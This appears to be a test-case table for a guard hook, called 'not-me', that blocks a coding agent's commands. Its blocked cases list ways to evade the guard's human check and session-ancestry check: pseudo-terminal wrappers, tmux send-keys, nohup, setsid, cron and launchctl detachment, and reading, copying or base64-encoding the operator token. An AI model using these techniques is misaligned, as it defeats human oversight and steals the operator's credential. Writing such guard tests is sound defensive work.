bash(B, OR, "FOO=1 git push origin feature/x")
bash(B, OR, "PYTHONPATH=/tmp notme status")
bash(A, None, "FOO=1 git status", "alloff")
# A pseudo-terminal wrapper must not drive the not-me CLI: it would pass the CLI's human check (always on).
bash(B, SP, 'script -q -c "notme pause off" /dev/null')
bash(B, SP, "script -qc 'notme allow-repo add acme/other' /dev/null", "alloff")
bash(B, SP, 'S""cript -c "notme config" /dev/null')
bash(B, SP, "/usr/bin/script -q /dev/null notme status")
bash(B, SP, "expect scripts/drive.exp")
bash(B, SP, "expect -c 'spawn notme pause off; interact'", "alloff")
bash(B, SP, "unbuffer notme status")
bash(B, SP, "/opt/homebrew/bin/unbuffer bash scripts/unpause.sh")
bash(B, SP, 'socat - EXEC:"notme pause off",pty,stderr')
bash(B, SP, "ssh -tt localhost notme status")
bash(B, SP, 'ssh -qt me@127.0.0.1 "notme pause off"')
bash(B, SP, "python3 -c \"import pty; pty.spawn(['notme', 'pause', 'off'])\"")
bash(B, SP, "python3 - <<'EOF'\nimport os\nos.openpty()\nos.system('NOT_ME_X=1 true')\nEOF")
bash(B, SP, "node -e \"require('node-pty').spawn('notme', ['pause', 'off'])\"")
bash(B, SP, "tmux send-keys -t 0 'notme pause off' Enter")
bash(B, SP, 'screen -S work -X stuff "notme allow-repo add acme/other\n"', "alloff")
bash(A, None, 'script -q -c "make test" /dev/null')
bash(A, None, "expect scripts/plain.exp")
bash(A, None, "unbuffer make test")
bash(A, None, "tmux ls")
bash(A, None, "tmux send-keys -t 0 'make test' Enter")
bash(A, None, "python3 -c \"print('empty')\"")
# Scripts run through a shell may not drive the not-me CLI where the guard cannot see.
bash(B, SP, "bash scripts/unpause.sh")
bash(B, SP, "./scripts/unpause.sh")
bash(B, SP, "bash {F}/app/scripts/unpause.sh", "alloff")
bash(B, SP, "sh scripts/drive.exp")
# The operator token is the operator's own.
bash(B, SP, "cat ~/.claude/not-me/operator-token")
bash(B, SP, "ls {H} | grep operator-tok''en", "alloff")
write(B, SP, "Read", "{H}/operator-token")
write(B, SP, "Read", "~/.claude/not-me/operator-token", "alloff")
write(B, SP, "Write", "{H}/operator-token")
write(B, SP, "Edit", "{F}/app/operator-token")
write(A, None, "Read", "{F}/app/README.md")
# Detaching a command from the session escapes the CLI's ancestry check: not for the not-me CLI (always on).
bash(B, SP, "nohup notme pause off &")
bash(B, SP, "setsid notme status", "alloff")
bash(B, SP, "notme status & disown")
bash(B, SP, "(notme pause off) &")
bash(B, SP, "notme status &!")
bash(B, SP, 'echo "notme pause off" | at now')
bash(B, SP, "echo notme status | batch", "alloff")
bash(B, SP, "systemd-run --user notme status")
bash(B, SP, "daemon -- notme config")
bash(B, SP, "start-stop-daemon --start --exec /usr/local/bin/notme -- status")
bash(B, SP, "launchctl submit -l x -- notme pause off")
bash(B, SP, 'echo "* * * * * NOT_ME_X=1 true" | crontab -')
bash(B, SP, "setsid bash scripts/unpause.sh")
bash(B, SP, "nohup sh {F}/app/scripts/unpause.sh &", "alloff")
bash(A, None, "nohup make test &")
bash(A, None, "crontab -l")
bash(A, None, "notme status 2>&1")
bash(A, None, "make test & wait")
# Reading or copying the operator token by glob, directory, redirection or substitution.
bash(B, SP, "head -c 10 ~/.claude/not-me/operator-token")
bash(B, SP, "cat {H}/op*")
bash(B, SP, "cd {H} && cat o*", "alloff")
bash(B, SP, "cp -r {H} /tmp/x")
bash(B, SP, "tar czf /tmp/x.tgz $NOT_ME_HOME")
bash(B, SP, "base64 < {H}/operator-t?ken")
bash(B, SP, "xxd {H}/operator-[t]oken")
bash(B, SP, "echo $(< {H}/op*)")
bash(B, SP, "grep -r x {H}/..")
bash(B, SP, "python3 -c \"print(open('{H}/operator-token').read())\"")
bash(B, SP, "ln -s {H}/operator-token x", "alloff")
bash(A, None, "cat README.md")
bash(A, None, "grep -r x scripts")
bash(A, None, "cp -r scripts {F}/app/scripts-copy")

# Substrings a block message must contain, by case id.
MESSAGE_CHECKS: Dict[str, List[str]] = {
    CASES[17][0]: ["not-me guard [other_repo]", "/not-me:allow-repo acme/other", "acme/other --everywhere",
                   "This repo (acme/app) may write only to: acme/app."],
    _repo_allow_id: ["/not-me:allow-repo acme/friend"],
    _unconfirmed_id: ["/not-me:allow-repo acme/web"],
}
